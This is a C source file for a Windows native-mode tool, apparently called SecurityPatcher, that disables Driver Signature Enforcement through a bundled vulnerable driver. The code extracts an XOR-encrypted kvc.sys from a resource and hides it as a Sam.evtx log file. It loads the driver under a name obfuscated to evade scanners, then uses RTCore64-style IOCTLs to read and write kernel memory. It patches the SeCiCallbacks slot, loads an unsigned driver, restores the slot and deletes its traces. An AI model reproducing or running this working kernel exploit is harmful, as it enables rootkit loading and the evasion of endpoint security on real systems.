// ============================================================================
// SecurityPatcher — DSE bypass via embedded vulnerability driver (BB variant)
//
// ExecuteAutoPatchLoad implements the 5-step bypass:
//   1. Extract kvc.sys from PE resource (XOR decrypt + LZNT1 decompress),
//      write to kvc_Log (\SystemRoot\System32\winevt\Logs\Sam.evtx)
//   2. Load kvc.sys under an obfuscated service name
//   3. Open device, resolve ntoskrnl base, read current SeCiCallbacks slot
//   4. Overwrite slot with SafeFunction (no-op); load the target unsigned driver
//   5. Restore original slot value; unload kvc.sys; Cleanupkvc (file + key)
//
// DSE state is persisted across reboots via [DSE_STATE] in drivers.ini so
// that an interrupted run can recover the original callback on the next boot.
//
// Physical memory I/O uses the RTCore64-compatible RTC_PACKET layout.
// ============================================================================

#include "SecurityPatcher.h"

// Returns the obfuscated driver/device name string from an assembly stub.
// The string is encoded at build time to avoid plaintext scanner detection.
extern PWSTR MmGetPoolDiagnosticString(void);

// ============================================================================
// RTC_PACKET — IOCTL payload for physical memory access via kvc.sys
//
// Layout matches the RTCore64 IOCTL packet format that kvc.sys expects.
// Padding fields must be zeroed; the driver checks them for validity.
//   addr  — physical or virtual address to read/write
//   size  — operation width in bytes (4 for DWORD operations)
//   value — data to write (write path) or data returned by driver (read path)
// ============================================================================
typedef struct _RTC_PACKET {
    UCHAR pad0[8];
    ULONGLONG addr;
    UCHAR pad1[8];
    ULONG size;
    ULONG value;
    UCHAR pad3[16];
} RTC_PACKET;

static BOOLEAN AsciiEqualsLiteralIgnoreCase(const char* left, const char* right) {
    ULONG index = 0;

    if (!left || !right) {
        return FALSE;
    }

    while (left[index] != 0 && right[index] != 0) {
        char a = left[index];
        char b = right[index];
        if (a >= 'a' && a <= 'z') a -= 32;
        if (b >= 'a' && b <= 'z') b -= 32;
        if (a != b) {
            return FALSE;
        }
        index++;
    }

    return left[index] == 0 && right[index] == 0;
}

// ============================================================================
// IOCTL OPERATIONS — Physical memory read/write via kvc.sys
//
// All three functions share the same RTC_PACKET I/O path.
// WriteMemory64 / ReadMemory64 split the 64-bit operation into two 32-bit
// IOCTL calls (low DWORD first, then high DWORD at address+4).
// This matches kvc.sys's 32-bit-at-a-time read/write model.
// ============================================================================

// Write a 32-bit value to the given kernel virtual address.
BOOLEAN WriteMemory32(HANDLE hDriver, ULONGLONG address, ULONG value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address;
    packet.size = 4;
    packet.value = value;

    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));

    return NT_SUCCESS(status);
}

// Write a 64-bit value as two consecutive 32-bit IOCTL operations (low, then high).
// NOTE: Not atomic — a torn write is theoretically possible on SMP.
// In practice the patched SeCiCallbacks slot is only read by the DSE fast path
// which is not racing with us at SMSS boot time.
BOOLEAN WriteMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG value, ULONG ioctl) {
    if (!WriteMemory32(hDriver, address, (ULONG)(value & 0xFFFFFFFF), ioctl))
        return FALSE;
    if (!WriteMemory32(hDriver, address + 4, (ULONG)((value >> 32) & 0xFFFFFFFF), ioctl))
        return FALSE;
    return TRUE;
}

BOOLEAN ReadMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG* value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;
    ULONG low, high;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address;
    packet.size = 4;

    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));

    if (!NT_SUCCESS(status))
        return FALSE;

    low = packet.value;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address + 4;
    packet.size = 4;

    status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                  ioctl, &packet, sizeof(packet),
                                  &packet, sizeof(packet));

    if (!NT_SUCCESS(status))
        return FALSE;

    high = packet.value;

    *value = ((ULONGLONG)high << 32) | (ULONGLONG)low;
    return TRUE;
}

// ============================================================================
// NTOSKRNL BASE ADDRESS
// ============================================================================

// Returns the kernel virtual base address of ntoskrnl.exe as reported by
// NtQuerySystemInformation(SystemModuleInformation).  Module[0] is always
// ntoskrnl on a properly booted system, but we search by name for safety.
ULONGLONG GetNtoskrnlBase(void) {
    SYSTEM_MODULE_INFORMATION* moduleInfo = NULL;
    ULONGLONG ntBase = 0;

    if (!QuerySystemModuleInformation(&moduleInfo)) {
        return 0;
    }

    if (moduleInfo->Count == 0) {
        FreeAllocatedBuffer(moduleInfo);
        return 0;
    }

    for (ULONG i = 0; i < moduleInfo->Count; i++) {
        char* imageName = moduleInfo->Modules[i].ImageName + moduleInfo->Modules[i].ModuleNameOffset;
        if (AsciiEqualsLiteralIgnoreCase(imageName, "ntoskrnl.exe")) {
            ntBase = (ULONGLONG)moduleInfo->Modules[i].ImageBase;
            break;
        }
    }

    FreeAllocatedBuffer(moduleInfo);
    return ntBase;
}

// ============================================================================
// DEVICE HANDLE
// ============================================================================

// Opens the kvc.sys device object for IOCTL communication.
// Returns a valid handle on success, NULL if the driver is not loaded or the
// device object does not exist yet.
HANDLE OpenDriverDevice(PCWSTR deviceName) {
    UNICODE_STRING usDeviceName;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hDevice = NULL;

    RtlInitUnicodeString(&usDeviceName, deviceName);
    InitializeObjectAttributes(&oa, &usDeviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtOpenFile(&hDevice, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
                                &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

    return NT_SUCCESS(status) ? hDevice : NULL;
}

// ============================================================================
// AUTOPATCH LOAD — 5-step DSE bypass and target driver load (BB variant)
//
// Steps:
//   1. ExtractkvcFromResource — XOR+LZNT1 decompress embedded payload to Sam.evtx
//   2. LoadDriver under obfuscated service name
//   3. Resolve ntoskrnl base; compute patchable callback address
//   4. Save original callback to drivers.ini [DSE_STATE]; write SafeFunction
//   5. Load target driver; restore original callback; unload kvc.sys; Cleanupkvc
//
// If the callback slot already contains SafeFunction (previous crash), the
// save/patch step is skipped and the stored originalCallback is used for restore.
// On any error after step 2, kvc.sys is unloaded and Cleanupkvc is called.
// ============================================================================

// entry          — INI_ENTRY for the driver to load under DSE bypass
// config         — global CONFIG_SETTINGS (offsets, device name, IOCTLs)
// originalCallback — in/out: receives the pre-patch callback value on first call;
//                    zeroed on successful restore
NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGLONG originalCallback) {
    NTSTATUS status;
    HANDLE hDriver;
    ULONGLONG ntBase, callbackToPatch, safeFunction, currentCallback;
    PWSTR driverName = MmGetPoolDiagnosticString();

    DisplayMessage(L"INFO: Starting AutoPatch sequence for driver: ");
    DisplayMessage(entry->ServiceName);
    DisplayMessage(L"\r\n");

    DEBUG_LOG(L"STEP 1: Loading non-compliant driver...\r\n");

    if (!ExtractkvcFromResource()) {
        DisplayMessage(L"FAILED: Cannot extract non-compliant driver from resource\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    status = LoadDriver(driverName, kvc_Log, L"KERNEL", L"SYSTEM");
    if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
        DisplayMessage(L"FAILED: Cannot load non-compliant driver\r\n");
        DisplayStatus(status);
        Cleanupkvc();
        return status;
    }
    DEBUG_LOG(L"SUCCESS: Non-compliant driver loaded\r\n");

    // If DriverDevice ends with "kvc", resolve to the dynamic telemetry device name
    WCHAR resolvedDevicePath[MAX_PATH_LEN];
    PWSTR devicePath = config->DriverDevice;
    {
        SIZE_T nameStart = 0;
        PWSTR p = config->DriverDevice;
        while (*p) {
            if (*p == L'\\') nameStart = (SIZE_T)(p - config->DriverDevice) + 1;
            p++;
        }
        if (config->DriverDevice[nameStart] == L'k' &&
            config->DriverDevice[nameStart + 1] == L'v' &&
            config->DriverDevice[nameStart + 2] == L'c' &&
            config->DriverDevice[nameStart + 3] == L'\0') {
            wcscpy_safe(resolvedDevicePath, MAX_PATH_LEN, L"\\Device\\");
            wcscat_safe(resolvedDevicePath, MAX_PATH_LEN, driverName);
            devicePath = resolvedDevicePath;
            DEBUG_LOG(L"DEBUG: Resolved 'kvc' to telemetry device name\r\n");
        }
    }

    hDriver = OpenDriverDevice(devicePath);
    if (!hDriver) {
        DisplayMessage(L"FAILED: Cannot open driver device\r\n");
        UnloadDriver(driverName);
        Cleanupkvc();
        return STATUS_NO_SUCH_DEVICE;
    }

    ntBase = GetNtoskrnlBase();
    if (ntBase == 0) {
        NtClose(hDriver);
        UnloadDriver(driverName);
        Cleanupkvc();
        DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    if (config->Offset_SeCiCallbacks == 0 || config->Offset_SafeFunction == 0) {
        NtClose(hDriver);
        UnloadDriver(driverName);
        Cleanupkvc();
        DisplayMessage(L"FAILED: Kernel offsets not found (INI or Scan)\r\n");
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    callbackToPatch = ntBase + config->Offset_SeCiCallbacks + config->Offset_Callback;
    safeFunction = ntBase + config->Offset_SafeFunction;

    if (!ReadMemory64(hDriver, callbackToPatch, &currentCallback, config->IoControlCode_Read)) {
        NtClose(hDriver);
        UnloadDriver(driverName);
        Cleanupkvc();
        DisplayMessage(L"FAILED: Cannot read current callback\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    if (currentCallback == safeFunction) {
        DEBUG_LOG(L"INFO: DSE already patched\r\n");
    } else {
        *originalCallback = currentCallback;
        SaveStateSection(currentCallback);
        DEBUG_LOG(L"INFO: Original callback saved\r\n");

        DEBUG_LOG(L"STEP 2: Patching DSE...\r\n");
        if (!WriteMemory64(hDriver, callbackToPatch, safeFunction, config->IoControlCode_Write)) {
            NtClose(hDriver);
            DisplayMessage(L"FAILED: DSE patch write failed\r\n");
            return STATUS_NO_SUCH_DEVICE;
        }
        DEBUG_LOG(L"SUCCESS: DSE patched\r\n");
    }

    DEBUG_LOG(L"STEP 3: Loading target driver...\r\n");
    status = LoadDriver(entry->ServiceName, entry->ImagePath, entry->DriverType, entry->StartType);
    if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
        DisplayMessage(L"FAILED: Cannot load target driver");
        DisplayStatus(status);
    } else {
        DEBUG_LOG(L"SUCCESS: Target driver loaded\r\n");
    }

    DEBUG_LOG(L"STEP 4: Restoring DSE...\r\n");
    if (*originalCallback != 0 && *originalCallback != safeFunction) {
        if (!WriteMemory64(hDriver, callbackToPatch, *originalCallback, config->IoControlCode_Write)) {
            DisplayMessage(L"WARNING: DSE restore failed\r\n");
        } else {
            DEBUG_LOG(L"SUCCESS: DSE restored\r\n");
            *originalCallback = 0;
            RemoveStateSection();
        }
    }

    DEBUG_LOG(L"STEP 5: Unloading non-compliant driver...\r\n");
    NtClose(hDriver);
    status = UnloadDriver(driverName);
    if (NT_SUCCESS(status)) {
        DEBUG_LOG(L"SUCCESS: Non-compliant driver unloaded\r\n");
    } else {
        DisplayMessage(L"WARNING: Non-compliant driver unload failed");
        DisplayStatus(status);
    }

    // Cleanupkvc is now in SetupManager
    Cleanupkvc();
    DisplayMessage(L"SUCCESS: AutoPatch sequence completed\r\n");
    return STATUS_SUCCESS;
}

// ============================================================================
// RAW ENCODING-AGNOSTIC SECTION DETECTOR
//
// Scans the raw bytes of STATE_FILE_PATH for the [DSE_STATE] header in either
// UTF-16 LE (native format) or UTF-8 / ANSI (editor-saved variants).
// Used as a fallback when ReadIniFile cannot parse the file encoding.
// ============================================================================

static BOOLEAN FileContainsDseStateRaw(void) {
    UNICODE_STRING usPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;
    NTSTATUS status;
    LARGE_INTEGER offset;
    UCHAR buf[4096];
    BOOLEAN found = FALSE;

    // UTF-16 LE pattern for "[DSE_STATE]" — 22 bytes, no NUL terminator
    static const UCHAR kPatternW[] = {
        '[',0,'D',0,'S',0,'E',0,'_',0,'S',0,'T',0,'A',0,'T',0,'E',0,']',0
    };
    // UTF-8 / ANSI pattern for "[DSE_STATE]" — 11 bytes
    static const UCHAR kPatternA[] = {
        '[','D','S','E','_','S','T','A','T','E',']'
    };
    const ULONG kLenW = sizeof(kPatternW);   // 22
    const ULONG kLenA = sizeof(kPatternA);   // 11
    const ULONG kTail = kLenW - 1;           // max carry-over needed

    RtlInitUnicodeString(&usPath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(status))
        return FALSE;

    offset.QuadPart = 0;

    // carry[] holds the last (kTail) bytes of the previous chunk so that
    // patterns spanning a chunk boundary are not missed.
    UCHAR carry[21];   // kLenW - 1 = 21
    ULONG carryLen = 0;
    memset_impl(carry, 0, sizeof(carry));

    while (!found) {
        status = NtReadFile(hFile, NULL, NULL, NULL, &iosb,
                            buf, sizeof(buf), &offset, NULL);
        if (!NT_SUCCESS(status) || iosb.Information == 0)
            break;

        ULONG bytesRead = (ULONG)iosb.Information;
        offset.QuadPart += bytesRead;

        // Merge carry + current chunk into a single window on the stack.
        UCHAR window[21 + 4096];
        memset_impl(window, 0, sizeof(window));
        memcpy_impl(window, carry, carryLen);
        memcpy_impl(window + carryLen, buf, bytesRead);
        ULONG windowLen = carryLen + bytesRead;

        for (ULONG i = 0; i + kLenW <= windowLen && !found; i++) {
            ULONG j = 0;
            while (j < kLenW && window[i + j] == kPatternW[j]) j++;
            if (j == kLenW) found = TRUE;
        }
        for (ULONG i = 0; i + kLenA <= windowLen && !found; i++) {
            ULONG j = 0;
            while (j < kLenA && window[i + j] == kPatternA[j]) j++;
            if (j == kLenA) found = TRUE;
        }

        // Save tail for the next iteration
        if (windowLen >= kTail) {
            carryLen = kTail;
            memcpy_impl(carry, window + windowLen - kTail, kTail);
        } else {
            carryLen = windowLen;
            memcpy_impl(carry, window, windowLen);
        }
    }

    NtClose(hFile);
    return found;
}

// ============================================================================
// DSE STATE PERSISTENCE
//
// The original SeCiCallbacks slot value is written to drivers.ini [DSE_STATE]
// before the slot is overwritten.  If the system loses power or crashes
// between patch and restore, the next boot's BootManager reads this value
// and restores DSE before executing any INI actions, avoiding a permanently
// disabled DSE state.
//
// File format: UTF-16 LE with BOM; appended to the end of drivers.ini.
// RemoveStateSection strips [DSE_STATE] by rewriting the file without it.
// ============================================================================

// Atomically replaces any existing [DSE_STATE] section and appends a new one
// containing the given callback value as a 0x-prefixed hex string.
// Called immediately before the DSE patch write; must not fail silently.
//
// Idempotency guard: if the exact same callback value is already present in
// [DSE_STATE], the function returns immediately without touching the file.
// This prevents duplicate sections accumulating across reboots or retries,
// regardless of the file encoding (UTF-16 LE BOM is the authoritative format;
// a file saved as UTF-8 by an external editor will cause ReadIniFile to fail
// gracefully and fall through to a clean re-write below).
BOOLEAN SaveStateSection(ULONGLONG callback) {
    // --- Idempotency guard (encoding-agnostic) ---
    ULONGLONG existing = 0;
    if (LoadStateSection(&existing) && existing == callback) {
        DEBUG_LOG(L"INFO: DSE state already present with matching value, skipping write\r\n");
        return TRUE;
    }
    if (existing == 0 && FileContainsDseStateRaw()) {
        DEBUG_LOG(L"INFO: [DSE_STATE] found via raw scan (non-UTF-16 file?), skipping duplicate write\r\n");
        return TRUE;
    }
    // --- End idempotency guard ---

    RemoveStateSection();  // ensure at most one [DSE_STATE] section exists

    // -----------------------------------------------------------------------
    // Detect file encoding by reading the first 2 bytes (BOM check).
    // UTF-16 LE BOM = 0xFF 0xFE  → write wide chars (native format)
    // Anything else (UTF-8, ANSI) → write narrow UTF-8 bytes
    // This prevents mixed-encoding files when the INI was saved by an editor
    // as UTF-8.
    // -----------------------------------------------------------------------
    BOOLEAN isUtf16 = FALSE;
    {
        UNICODE_STRING usBom;
        OBJECT_ATTRIBUTES oaBom;
        IO_STATUS_BLOCK iosbBom;
        HANDLE hBom = NULL;
        UCHAR bomBytes[2] = { 0, 0 };
        LARGE_INTEGER bomOffset;
        bomOffset.QuadPart = 0;

        RtlInitUnicodeString(&usBom, STATE_FILE_PATH);
        InitializeObjectAttributes(&oaBom, &usBom, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtOpenFile(&hBom, FILE_READ_DATA | SYNCHRONIZE, &oaBom, &iosbBom,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  FILE_SYNCHRONOUS_IO_NONALERT))) {
            NtReadFile(hBom, NULL, NULL, NULL, &iosbBom,
                       bomBytes, 2, &bomOffset, NULL);
            NtClose(hBom);
        }
        isUtf16 = (bomBytes[0] == 0xFF && bomBytes[1] == 0xFE);
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                        FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        // File does not exist yet — create it with UTF-16 LE BOM
        status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                              NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE,
                              FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (!NT_SUCCESS(status))
            return FALSE;

        WCHAR bom = 0xFEFF;
        byteOffset.QuadPart = 0;
        NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom, sizeof(WCHAR), &byteOffset, NULL);
        isUtf16 = TRUE;
    }

    // Query current file size to append at EOF
    FILE_STANDARD_INFORMATION fileInfo;
    memset_impl(&fileInfo, 0, sizeof(fileInfo));
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo,
                                    sizeof(FILE_STANDARD_INFORMATION),
                                    FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        return FALSE;
    }
    byteOffset.QuadPart = fileInfo.EndOfFile.QuadPart;

    WCHAR hexValue[32];
    ULONGLONGToHexString(callback, hexValue, TRUE);

    if (isUtf16) {
        // --- UTF-16 LE write (native) ---
        WCHAR content[512];
        SIZE_T len = wcscpy_safe(content, 512, L"\r\n[DSE_STATE]\r\nOriginalCallback=");
        len = wcscat_safe(content, 512, hexValue);
        len = wcscat_safe(content, 512, L"\r\n");
        if (len >= 512) { NtClose(hFile); return FALSE; }

        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
                             (ULONG)(wcslen(content) * sizeof(WCHAR)),
                             &byteOffset, NULL);
    } else {
        // --- UTF-8 / ANSI write ---
        // Build narrow string manually (all chars are ASCII-safe)
        char content[512];
        char hexNarrow[32];
        ULONG hi = 0;

        // Convert WCHAR hex string to narrow chars
        while (hexValue[hi] && hi < 31) {
            hexNarrow[hi] = (char)hexValue[hi];
            hi++;
        }
        hexNarrow[hi] = '\0';

        // Concatenate: "\r\n[DSE_STATE]\r\nOriginalCallback=<hex>\r\n"
        const char* prefix = "\r\n[DSE_STATE]\r\nOriginalCallback=";
        ULONG pi = 0, ci = 0;
        while (prefix[pi] && ci < 511) content[ci++] = prefix[pi++];
        pi = 0;
        while (hexNarrow[pi] && ci < 511) content[ci++] = hexNarrow[pi++];
        content[ci++] = '\r'; content[ci++] = '\n'; content[ci] = '\0';

        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
                             ci, &byteOffset, NULL);
    }

    NtClose(hFile);

    if (NT_SUCCESS(status)) {
        DEBUG_LOG(L"INFO: DSE state saved to drivers.ini\r\n");
        return TRUE;
    }

    return FALSE;
}

BOOLEAN LoadStateSection(ULONGLONG* outCallback) {
    PWSTR fileContent = NULL;
    BOOLEAN found = FALSE;

    if (!ReadIniFile(STATE_FILE_PATH, &fileContent)) {
        return FALSE;
    }

    PWSTR line = fileContent;
    BOOLEAN inDseSection = FALSE;

    if (line[0] == 0xFEFF) {
        line++;
    }

    while (*line) {
        PWSTR nextLine = line;
        while (*nextLine && *nextLine != L'\r' && *nextLine != L'\n')
            nextLine++;

        WCHAR lineBuf[MAX_PATH_LEN];
        ULONG i = 0;
        while (line < nextLine && i < (MAX_PATH_LEN - 1))
            lineBuf[i++] = *line++;
        lineBuf[i] = 0;

        line = nextLine;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        TrimString(lineBuf);

        if (lineBuf[0] == L'[') {
            inDseSection = (_wcsicmp_impl(lineBuf, L"[DSE_STATE]") == 0);
            continue;
        }

        if (inDseSection && lineBuf[0] != 0 && lineBuf[0] != L';') {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=')
                equals++;

            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key);
                TrimString(value);

                if (_wcsicmp_impl(key, L"OriginalCallback") == 0) {
                    if (StringToULONGLONG(value, outCallback)) {
                        DEBUG_LOG(L"INFO: Loaded DSE state from drivers.ini\r\n");
                        found = TRUE;
                        break;
                    }
                }
            }
        }
    }
    FreeIniFileBuffer(fileContent);
    return found;
}

BOOLEAN RemoveStateSection(void) {
    PWSTR iniContent = NULL;
    PWSTR newContent = NULL;
    BOOLEAN inDseSection = FALSE;
    BOOLEAN foundDseSection = FALSE;
    BOOLEAN skipLine = FALSE;
    SIZE_T newLen = 0;
    SIZE_T sourceLen;
    SIZE_T newCapacity;

    if (!ReadIniFile(STATE_FILE_PATH, &iniContent)) {
        return FALSE;
    }

    PWSTR line = iniContent;

    if (line[0] == 0xFEFF)
        line++;

    sourceLen = wcslen(line);
    newCapacity = (sourceLen * 2) + 2;
    if (!AllocateZeroedBuffer(newCapacity * sizeof(WCHAR), (PVOID*)&newContent)) {
        FreeIniFileBuffer(iniContent);
        return FALSE;
    }

    newContent[0] = 0;

    while (*line) {
        PWSTR lineStart = line;
        PWSTR lineEnd = line;

        while (*lineEnd && *lineEnd != L'\r' && *lineEnd != L'\n')
            lineEnd++;

        WCHAR lineBuf[MAX_PATH_LEN];
        ULONG i = 0;
        PWSTR ptr = lineStart;
        while (ptr < lineEnd && i < MAX_PATH_LEN - 1) {
            lineBuf[i++] = *ptr++;
        }
        lineBuf[i] = 0;

        line = lineEnd;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        WCHAR trimmedBuf[MAX_PATH_LEN];
        wcscpy_safe(trimmedBuf, MAX_PATH_LEN, lineBuf);
        TrimString(trimmedBuf);

        BOOLEAN isSeparator = FALSE;
        if (trimmedBuf[0] == L';' && wcslen(trimmedBuf) > 10) {
            isSeparator = TRUE;
            for (ULONG j = 1; trimmedBuf[j] != 0; j++) {
                if (trimmedBuf[j] != L'=' && trimmedBuf[j] != L' ') {
                    isSeparator = FALSE;
                    break;
                }
            }
        }

        if (trimmedBuf[0] == L'[') {
            if (_wcsicmp_impl(trimmedBuf, L"[DSE_STATE]") == 0) {
                inDseSection = TRUE;
                foundDseSection = TRUE;
                skipLine = TRUE;
            } else {
                inDseSection = FALSE;
                skipLine = FALSE;
            }
        }

        if (inDseSection || (isSeparator && (foundDseSection || skipLine))) {
            if (isSeparator && inDseSection) {
                inDseSection = FALSE;
            }
            continue;
        }

        // Safe concatenation with overflow check
        if (newLen > 0) {
            if (!wcscat_check(newContent, newCapacity, L"\r\n")) {
                FreeAllocatedBuffer(newContent);
                FreeIniFileBuffer(iniContent);
                return FALSE;
            }
            wcscat_safe(newContent, newCapacity, L"\r\n");
            newLen = wcslen(newContent);
        }

        if (!wcscat_check(newContent, newCapacity, lineBuf)) {
            FreeAllocatedBuffer(newContent);
            FreeIniFileBuffer(iniContent);
            return FALSE;
        }
        wcscat_safe(newContent, newCapacity, lineBuf);
        newLen = wcslen(newContent);
    }

    if (!foundDseSection) {
        FreeAllocatedBuffer(newContent);
        FreeIniFileBuffer(iniContent);
        return TRUE;
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        FreeAllocatedBuffer(newContent);
        FreeIniFileBuffer(iniContent);
        return FALSE;
    }

    WCHAR bom = 0xFEFF;
    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
                        sizeof(WCHAR), &byteOffset, NULL);

    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        FreeAllocatedBuffer(newContent);
        FreeIniFileBuffer(iniContent);
        return FALSE;
    }

    byteOffset.QuadPart = sizeof(WCHAR);
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, newContent,
                        (ULONG)(wcslen(newContent) * sizeof(WCHAR)),
                        &byteOffset, NULL);

    NtClose(hFile);
    FreeAllocatedBuffer(newContent);
    FreeIniFileBuffer(iniContent);

    if (NT_SUCCESS(status)) {
        DEBUG_LOG(L"INFO: DSE state removed from drivers.ini\r\n");
        return TRUE;
    }

    return FALSE;
}
